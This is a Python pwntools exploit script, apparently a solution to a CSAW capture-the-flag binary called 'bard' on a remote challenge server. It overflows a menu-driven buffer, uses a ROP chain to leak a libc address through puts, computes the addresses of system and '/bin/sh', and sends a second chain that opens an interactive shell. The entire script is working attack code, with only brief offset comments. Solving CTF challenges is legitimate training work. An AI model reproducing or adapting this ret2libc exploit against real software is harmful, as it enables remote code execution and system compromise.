from pwn import *
import sys
import os

remote_ip,port = 'pwn.chal.csaw.io','5019'
binary = 'bard'
brkpts = '''

b*0x40107a

'''

if sys.argv[1] == 'remote' :
    io = remote(remote_ip,port)

else:
    io = process(binary,env={'LD_PRELOAD':'./libc-2.27.so'})
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)


def good(weapon,name):
	sla(":\n",'g')
	sla("cy\n",str(weapon))
	sa("name:\n",name)

def evil(weapon,name):
	sla(":\n",'e')
	sla("ent\n",str(weapon))
	sa("name:\n",name)

def sheriff():
	sla("do?\n",'e')

def zombie(inp):
	sla("do?\n",inp)

def trigger(payload):
	for i in range(1):
		good(1,b"A"*8)
	for i in range(8):
		evil(1,b"B"*8)
	
	good(1,payload)

	gdb.attach(io,brkpts)

	for i in range(1):
		zombie('r')
	for i in range(8):
		sheriff()
	for i in range(1):
		zombie('r')	



puts = 0x4006d0
pop_rdi = 0x401143
main = 0x40107b
ret = 0x4006ae

if __name__== "__main__":	

	#good -> 48 bytes
	#bad  -> 56 bytes
	#saved rip -> 480+32

	payload = p64(pop_rdi)
	payload += p64(0x602020)
	payload += p64(puts)
	payload += p64(main)
	trigger(payload)

	ru("away.")
	rl()
	leak = re(6)
	leak = u64(leak+b'\x00\x00')-0x80a30
	system = leak + 0x4f4e0
	binsh = leak +0x1b40fa
	
	log.info("base {} ".format(hex(leak)))
	log.info("sys {}".format(hex(system)))
	log.info("/bin/sh {}".format(hex(binsh)))
	

	payload = p64(ret)
	payload += p64(pop_rdi)
	payload += p64(binsh)
	payload += p64(system)
	trigger(payload)


	io.interactive()




